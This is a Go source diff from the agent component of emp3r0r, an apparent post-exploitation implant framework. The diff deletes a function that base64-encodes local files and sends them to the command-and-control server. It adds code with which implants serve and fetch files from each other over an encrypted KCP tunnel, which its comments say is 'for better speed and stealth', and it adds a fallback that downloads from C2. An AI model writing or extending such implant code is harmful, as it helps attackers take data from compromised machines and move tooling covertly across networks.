@@ -2,13 +2,14 @@ package agent
 
 import (
 	"bufio"
-	"encoding/base64"
+	"context"
 	"fmt"
 	"io"
 	"log"
 	"net/http"
 	"net/url"
 	"os"
+	"sync"
 	"time"
 
 	"github.com/cavaliergopher/grab/v3"
@@ -17,38 +18,10 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// send local file to CC, Deprecated
-func file2CC(filepath string, offset int64) (checksum string, err error) {
-	// open and read the target file
-	f, err := os.Open(filepath)
-	if err != nil {
-		return
-	}
-	total := util.FileSize(filepath)
-	bytes := make([]byte, total-offset)
-	_, err = f.ReadAt(bytes, offset)
-	if err != nil {
-		return
-	}
-	checksum = tun.SHA256SumRaw(bytes)
-
-	// base64 encode
-	payload := base64.StdEncoding.EncodeToString(bytes)
-
-	magic_str := emp3r0r_data.MagicString
-	fileData := emp3r0r_data.MsgTunData{
-		Payload: "FILE" + magic_str + filepath + magic_str + payload,
-		Tag:     RuntimeConfig.AgentTag,
-	}
-
-	// send
-	return checksum, Send2CC(&fileData)
-}
-
 // SmartDownload download via grab, if path is empty, return []byte instead
 // This will try to download from other agents for better speed and stealth
 // when fail, will try to download from CC
-func SmartDownload(file_to_download, path, checksum string) (data []byte, err error) {
+func SmartDownload(download_addr, file_to_download, path, checksum string) (data []byte, err error) {
 	if util.IsFileExist(path) {
 		// check checksum
 		if tun.SHA256SumFile(path) == checksum {
@@ -56,6 +29,20 @@ func SmartDownload(file_to_download, path, checksum string) (data []byte, err er
 			return
 		}
 	}
+
+	// if download_host is given, download from the specified agent
+	if download_addr != "" {
+		// download from other agent
+		err = RequestAndDownloadFile(download_addr, file_to_download, path, checksum)
+		if util.IsFileExist(path) {
+			// checksum
+			if tun.SHA256SumFile(path) == checksum {
+				log.Printf("SmartDownload: %s downloaded via TCP and checksum matches", path)
+			}
+		}
+		return nil, err
+	}
+
 	return DownloadViaC2(file_to_download, path, checksum)
 }
 
@@ -152,6 +139,10 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 				log.Print(err)
 				return
 			}
+			if checksum != tun.SHA256SumFile(path) {
+				err = fmt.Errorf("DownloadViaCC checksum failed: %s != %s", tun.SHA256SumFile(path), checksum)
+				return
+			}
 			log.Printf("DownloadViaCC: saved %s to %s (%d bytes)", url, path, resp.Size())
 			return
 		case <-t.C:
@@ -201,4 +192,121 @@ func sendFile2CC(filepath string, offset int64, token string) (err error) {
 		log.Printf("sendFile2CC failed, %d bytes transfered: %v", n, err)
 	}
 	return
+}
+
+var (
+	// AgentFileTransferSessions stores active file transfer sessions between agents
+	AgentFileTransferSessions = make(map[string]context.CancelFunc)
+	sessionsMutex             sync.Mutex
+
+	// FileServer switch
+	FileServerCtx    context.Context
+	FileServerCancel context.CancelFunc
+)
+
+// FileServer hosts files on an HTTP server with AES-GCM encryption in stream mode
+func FileServer(port int, ctx context.Context, cancel context.CancelFunc) (err error) {
+	defer cancel()
+
+	// start HTTP server on local interface on port-1
+	listen_addr := fmt.Sprintf("127.0.0.1:%d", port-1)
+	http.HandleFunc("/", handleClient)
+	server := &http.Server{Addr: listen_addr}
+
+	// start KCP tunnel server that forwards to HTTP server
+	portstr := fmt.Sprintf("%d", port)
+	go tun.KCPTunServer(listen_addr, portstr, RuntimeConfig.Password, emp3r0r_data.MagicString, ctx, cancel)
+
+	go func() {
+		<-ctx.Done()
+		server.Close()
+	}()
+
+	log.Printf("HTTP secure file server started on port %d", port)
+	err = server.ListenAndServe()
+	if err != nil && err != http.ErrServerClosed {
+		return fmt.Errorf("FileServer: failed to start HTTP server: %v", err)
+	}
+	log.Printf("FileServer on %d exited", port)
+	return nil
+}
+
+func handleClient(w http.ResponseWriter, r *http.Request) {
+	file_path := r.URL.Query().Get("file_path")
+	checksum := r.URL.Query().Get("checksum")
+
+	// if file does not exist, download it from CC
+	if !util.IsFileExist(file_path) {
+		log.Printf("handleClient: file %s (%s) does not exist, downloading from CC", file_path, checksum)
+		_, err := DownloadViaC2(file_path, file_path, checksum)
+		if err != nil {
+			log.Printf("handleClient: failed to download file from CC: %v", err)
+			http.Error(w, "Failed to download file from CC", http.StatusInternalServerError)
+			return
+		}
+	}
+
+	// serve the file
+	http.ServeFile(w, r, file_path)
+}
+
+// RequestAndDownloadFile requests and downloads a file from an HTTP server to a specified path
+func RequestAndDownloadFile(address, filepath, path, checksum string) (err error) {
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	// start local KCP client tunnel to connect to KCP server then HTTP server
+	kcp_listen_port := fmt.Sprintf("%d", util.RandInt(10000, 50000))
+	go tun.KCPTunClient(address, kcp_listen_port, RuntimeConfig.Password, emp3r0r_data.MagicString, ctx, cancel)
+
+	// wait until port is open
+	for !tun.IsPortOpen("127.0.0.1", kcp_listen_port) {
+		log.Printf("RequestAndDownloadFile: waiting for port %s to open", kcp_listen_port)
+		time.Sleep(time.Second)
+	}
+
+	// use grab to download the file
+	client := grab.NewClient()
+	req, err := grab.NewRequest(path, fmt.Sprintf("http://127.0.0.1:%s/?file_path=%s&checksum=%s", kcp_listen_port, url.QueryEscape(filepath), url.QueryEscape(checksum)))
+	if err != nil {
+		return fmt.Errorf("RequestAndDownloadFile: failed to create grab request: %v", err)
+	}
+	resp := client.Do(req)
+
+	// progress
+	t := time.NewTicker(5 * time.Second)
+	defer t.Stop()
+	for !resp.IsComplete() {
+		select {
+		case <-resp.Done:
+			err = resp.Err()
+			if err != nil {
+				return fmt.Errorf("RequestAndDownloadFile: download finished with error: %v", err)
+			}
+			if checksum != tun.SHA256SumFile(path) {
+				return fmt.Errorf("RequestAndDownloadFile: checksum failed: %s != %s", tun.SHA256SumFile(path), checksum)
+			}
+			log.Printf("RequestAndDownloadFile: saved %s to %s (%d bytes)", filepath, path, resp.Size())
+			return nil
+		case <-t.C:
+			log.Printf("%.02f%% complete at %.02f KB/s", resp.Progress()*100, resp.BytesPerSecond()/1024)
+		}
+	}
+
+	return nil
+}
+
+// CancelFileTransfer cancels an ongoing file transfer session
+func CancelFileTransfer(clientAddr, filepath string) {
+	sessionID := fmt.Sprintf("%s:%s", clientAddr, filepath)
+	sessionsMutex.Lock()
+	defer sessionsMutex.Unlock()
+
+	if cancel, exists := AgentFileTransferSessions[sessionID]; exists {
+		cancel()
+		log.Printf("File transfer session for %s canceled", sessionID)
+		delete(AgentFileTransferSessions, sessionID)
+	} else {
+		log.Printf("No active file transfer session for %s", sessionID)
+	}
 }
